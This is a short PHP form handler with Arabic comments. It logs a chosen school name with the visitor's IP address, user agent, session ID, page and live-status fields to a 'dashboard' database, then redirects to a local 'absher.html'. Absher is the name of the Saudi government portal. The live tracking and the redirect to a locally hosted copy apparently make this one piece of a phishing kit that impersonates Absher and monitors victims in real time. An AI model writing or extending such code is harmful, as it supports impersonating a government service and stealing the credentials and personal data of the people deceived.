<?php
session_start();

// الاتصال بقاعدة البيانات
require_once 'dashboard/init.php';
$user = new User();

// التحقق من إرسال النموذج
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $school_name = isset($_POST['school_name']) ? trim($_POST['school_name']) : '';
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $session_id = session_id();
    
    if (!empty($school_name)) {
        
        // إنشاء مستخدم جديد مع اسم المدرسة
        $username_client = 'school_' . time();
        
        $userData = [
            'username' => $username_client,
            'selected_school' => $school_name,
            'message' => 'اختار مدرسة: ' . $school_name,
            'currentpage' => 'select_school.php',
            'ip_address' => $ip_address,
            'user_agent' => $user_agent,
            'session_id' => $session_id,
            'live' => 1,
            'lastlive' => round(microtime(true) * 1000),
            'status' => 0
        ];
        
        // حفظ في قاعدة البيانات
        $user_id = $user->insertFormData($userData);
        
        if ($user_id) {
            // حفظ user_id واسم المدرسة في الجلسة
            $_SESSION['user_id'] = $user_id;
            $_SESSION['username'] = $username_client;
            $_SESSION['selected_school'] = $school_name;
        }
    }
    
    // إعادة التوجيه لصفحة أبشر
    header("Location: absher.html");
    exit();
    
} else {
    // إذا لم يكن POST، أعد التوجيه للصفحة الرئيسية
    header("Location: saudi_schools.html");
    exit();
}
?>